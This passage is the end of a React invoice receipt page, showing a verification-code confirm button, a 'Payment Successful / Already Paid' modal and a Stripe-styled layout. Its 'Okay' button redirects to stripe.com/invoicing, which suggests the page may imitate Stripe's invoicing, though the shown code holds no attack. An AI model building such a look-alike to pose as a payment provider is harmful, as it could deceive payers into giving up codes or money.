                  type="submit"
                  className="success-modal-btn"
                  style={{ flex: 2 }}
                  disabled={isLoading || !authInputValue.trim()}
                >
                  {isLoading ? 'Verifying…' : 'Confirm'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ===== LOCKED SUCCESS / ALREADY-PAID MODAL ===== */}
      {showSuccessModal && (
        <div
          className="success-modal-backdrop"
          role="dialog"
          aria-modal="true"
          aria-labelledby="success-modal-title"
          onClick={(e) => e.stopPropagation()}
        >
          <div className="success-modal-card" onClick={(e) => e.stopPropagation()}>
            {/* Green checkmark icon */}
            <div className="success-modal-icon-wrapper">
              <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <polyline points="20 6 9 17 4 12" />
              </svg>
            </div>

            <h2 className="success-modal-title" id="success-modal-title">
              {isAlreadyPaidVisit ? 'Invoice Already Paid' : 'Payment Successful'}
            </h2>
            <p className="success-modal-desc">
              {isAlreadyPaidVisit ? (
                <>
                  This invoice has already been paid. Receipt was sent to{' '}
                  <strong>{recipientEmail}</strong>
                </>
              ) : (
                <>
                  Receipt sent to <strong>{recipientEmail}</strong>
                </>
              )}
            </p>

            <table className="success-modal-table" aria-label="Payment receipt summary">
              <tbody>
                <tr>
                  <th scope="row">Status</th>
                  <td className="success-modal-status-paid">Paid</td>
                </tr>
                <tr>
                  <th scope="row">Amount</th>
                  <td>{formatUSD(receipt.total)}</td>
                </tr>
                <tr>
                  <th scope="row">Invoice</th>
                  <td>{invoiceNumber}</td>
                </tr>
                {paymentDetails?.date && (
                  <tr>
                    <th scope="row">Date</th>
                    <td>{paymentDetails.date}</td>
                  </tr>
                )}
                {paymentDetails?.ref && (
                  <tr>
                    <th scope="row">Reference</th>
                    <td className="success-modal-ref-cell">{paymentDetails.ref}</td>
                  </tr>
                )}
              </tbody>
            </table>

            <button
              type="button"
              className="success-modal-btn"
              onClick={() => {
                window.location.href = 'https://stripe.com/invoicing';
              }}
            >
              Okay
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default function ReceiptPage(props: Props) {
  return (
    <React.Suspense fallback={<div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#697386' }}>Loading invoice...</div>}>
      <ReceiptPageContent {...props} />
    </React.Suspense>
  );
}
